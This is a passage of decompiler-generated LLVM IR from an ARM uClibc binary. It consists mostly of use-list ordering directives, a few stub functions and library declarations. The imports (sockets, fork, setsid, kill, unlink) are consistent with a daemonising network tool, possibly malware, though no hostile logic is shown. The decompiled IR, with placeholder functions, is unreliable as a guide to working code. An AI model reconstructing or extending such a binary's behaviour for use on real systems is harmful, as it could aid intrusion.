474, 475, 476, 173, 477, 478, 479, 193, 261, 223, 480, 482, 484, 483, 481, 271, 485, 486, 272, 487, 488, 489, 490, 195, 491, 492, 190, 273, 493, 333, 332, 331, 330, 329, 328, 327, 326, 325, 324, 9, 33, 32, 29, 30, 31, 36, 43, 44, 35, 38, 37, 34, 39, 41, 40, 42, 334, 335, 157, 156, 155, 158, 281 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @function_1430c() local_unnamed_addr {
dec_label_pc_1430c:
  %v5_14310 = load i32, i32* @r0, align 4
  ret i32 %v5_14310

; uselistorder directives
  uselistorder i32* @r0, { 2, 4, 5, 8, 78, 9, 79, 10, 80, 12, 11, 37, 38, 0, 33, 17, 18, 19, 20, 3, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 34, 35, 1, 39, 36, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 6, 7, 13, 14, 15, 16 }
}

define i32 @function_14314() local_unnamed_addr {
entry:
  %v3_14318 = load i32, i32* @r4, align 4
  %v0_14320 = call i32 @function_8e08()
  call void @__pseudo_branch(i32 %v3_14318)
  ret i32 %v0_14320

; uselistorder directives
  uselistorder void (i32)* @__pseudo_branch, { 0, 5, 7, 8, 9, 1, 2, 3, 4, 6 }
  uselistorder i32 0, { 0, 805, 62, 806, 807, 122, 121, 377, 51, 52, 53, 54, 379, 378, 40, 39, 63, 808, 809, 810, 811, 813, 812, 1, 814, 815, 124, 123, 380, 55, 56, 57, 58, 382, 381, 42, 41, 38, 44, 816, 383, 2, 817, 818, 59, 819, 820, 821, 822, 823, 71, 384, 387, 385, 386, 824, 388, 69, 72, 500, 501, 60, 502, 503, 504, 3, 405, 125, 5, 4, 73, 505, 74, 406, 6, 126, 75, 76, 155, 43, 77, 159, 466, 49, 437, 438, 507, 506, 508, 509, 11, 78, 510, 81, 80, 79, 156, 157, 158, 83, 82, 84, 160, 511, 512, 85, 486, 487, 70, 86, 513, 87, 415, 88, 514, 515, 89, 516, 517, 90, 467, 91, 468, 7, 161, 430, 431, 433, 92, 432, 46, 434, 8, 452, 453, 456, 457, 454, 455, 458, 459, 416, 162, 418, 93, 419, 420, 421, 422, 423, 424, 425, 94, 47, 163, 426, 417, 165, 166, 9, 427, 428, 95, 429, 36, 37, 167, 168, 164, 435, 169, 436, 96, 97, 170, 439, 440, 441, 442, 129, 443, 444, 128, 445, 446, 447, 66, 448, 450, 449, 64, 65, 98, 127, 172, 173, 171, 451, 131, 132, 133, 67, 99, 45, 100, 460, 461, 104, 101, 102, 103, 462, 174, 136, 135, 134, 175, 137, 176, 138, 139, 177, 178, 179, 180, 181, 182, 183, 184, 140, 185, 186, 187, 188, 189, 190, 141, 191, 142, 143, 144, 145, 192, 193, 146, 147, 194, 148, 149, 195, 463, 518, 105, 519, 464, 106, 465, 469, 470, 471, 472, 473, 474, 107, 475, 476, 477, 478, 479, 480, 481, 482, 108, 109, 483, 484, 485, 488, 110, 489, 490, 111, 196, 491, 492, 12, 493, 494, 495, 496, 497, 197, 498, 112, 520, 521, 522, 499, 523, 524, 525, 526, 527, 150, 528, 529, 530, 531, 532, 533, 534, 535, 151, 536, 389, 390, 391, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 13, 578, 579, 50, 580, 113, 114, 581, 582, 583, 584, 585, 392, 407, 586, 587, 588, 14, 589, 590, 591, 592, 15, 593, 594, 595, 596, 597, 598, 599, 16, 600, 601, 119, 602, 603, 604, 605, 606, 607, 17, 608, 609, 610, 18, 611, 612, 613, 19, 614, 615, 616, 617, 200, 631, 632, 618, 619, 620, 621, 622, 623, 624, 625, 626, 393, 408, 627, 628, 629, 630, 394, 409, 633, 634, 635, 20, 636, 637, 201, 638, 639, 640, 641, 642, 643, 644, 645, 395, 410, 646, 647, 648, 21, 649, 650, 651, 652, 22, 653, 396, 654, 655, 115, 658, 659, 397, 116, 656, 657, 117, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 398, 411, 671, 672, 673, 23, 674, 675, 676, 677, 678, 679, 24, 680, 68, 681, 682, 683, 684, 399, 412, 685, 686, 687, 25, 688, 118, 689, 690, 691, 26, 692, 693, 694, 695, 696, 400, 413, 697, 698, 699, 27, 700, 701, 702, 28, 198, 199, 703, 704, 705, 706, 707, 401, 414, 708, 709, 710, 29, 711, 712, 713, 30, 714, 715, 716, 31, 717, 718, 719, 32, 720, 721, 722, 723, 33, 724, 725, 766, 767, 726, 727, 728, 729, 730, 731, 732, 733, 736, 737, 402, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 130, 749, 752, 753, 756, 757, 758, 34, 754, 755, 750, 751, 759, 760, 120, 761, 762, 763, 764, 765, 768, 769, 770, 35, 771, 772, 773, 774, 776, 48, 202, 777, 775, 734, 735, 61, 778, 403, 404, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 152, 799, 153, 800, 154, 801, 10, 804, 802, 803, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837 }
  uselistorder i32* @r4, { 9, 286, 193, 194, 161, 32, 33, 10, 195, 196, 197, 198, 199, 200, 162, 163, 166, 167, 18, 19, 20, 21, 22, 23, 24, 147, 48, 49, 164, 165, 11, 12, 13, 14, 15, 16, 17, 25, 26, 27, 28, 29, 30, 31, 34, 35, 36, 0, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 201, 202, 203, 168, 169, 170, 171, 172, 173, 1, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 186, 184, 185, 187, 188, 189, 190, 191, 192, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 8, 233, 3, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 7, 2, 245, 246, 247, 248, 249, 250, 251, 6, 252, 253, 254, 5, 255, 256, 257, 4, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 287 }
}

declare void @abort() local_unnamed_addr

declare i32 @accept(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32* @calloc(i32, i32) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @bind(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @inet_addr(i8*) local_unnamed_addr

declare i32 @chdir(i8*) local_unnamed_addr

declare i32 @setsockopt(i32, i32, i32, i32*, i32) local_unnamed_addr

declare void (i32)* @signal(i32, void (i32)*) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @unlink(i8*) local_unnamed_addr

declare i32 @sendto(i32, i32*, i32, i32, %sockaddr*, i32) local_unnamed_addr

declare i32* @realloc(i32*, i32) local_unnamed_addr

declare i32 @listen(i32, i32) local_unnamed_addr

declare i32 @fork() local_unnamed_addr

declare i32 @__uClibc_main() local_unnamed_addr

declare i32* @memset(i32*, i32, i32) local_unnamed_addr

declare i32 @getppid() local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare %__dirstream* @opendir(i8*) local_unnamed_addr

declare i32 @getsockopt(i32, i32, i32, i32*, i32*) local_unnamed_addr

declare i32* @__errno_location() local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @atoi(i8*) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @clock() local_unnamed_addr

declare i32 @setsid() local_unnamed_addr

declare i32 @closedir(%__dirstream*) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @raise(i32) local_unnamed_addr

declare void @free(i32*) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @getsockname(i32, %sockaddr*, i32*) local_unnamed_addr

define i32 @__data_start(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1ccf8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1ccf8, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder i1 false, { 1, 2, 0, 27, 54, 55, 56, 3, 25, 50, 57, 29, 58, 59, 30, 60, 9, 10, 11, 12, 31, 61, 62, 47, 63, 64, 65, 36, 66, 14, 15, 37, 67, 38, 68, 32, 33, 34, 13, 69, 35, 70, 71, 46, 72, 73, 74, 75, 76, 77, 39, 40, 78, 79, 41, 80, 42, 43, 81, 44, 82, 45, 83, 28, 84, 85, 86, 87, 88, 89, 16, 17, 48, 90, 91, 23, 92, 49, 6, 7, 18, 8, 19, 20, 21, 4, 22, 93, 24, 51, 52, 94, 5, 53, 95, 26, 96 }
  uselistorder i1* @cpsr_z, { 8, 4, 5, 0, 1, 2, 3, 6, 7 }
  uselistorder label %bb1, { 1, 0 }
}

declare i32 @unknown_e28cca14() local_unnamed_addr

declare i32 @unknown_e5bcf018() local_unnamed_addr

declare i32 @unknown_e5bcf010() local_unnamed_addr

declare i32 @unknown_e5bcf008() local_unnamed_addr

declare i32 @unknown_e5bcf000() local_unnamed_addr

declare i32 @unknown_e28cca13() local_unnamed_addr

declare i32 @unknown_e5bcfff8() local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare %sockaddr* @__decompiler_undefined_function_3() local_unnamed_addr

declare void (i32)* @__decompiler_undefined_function_4() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
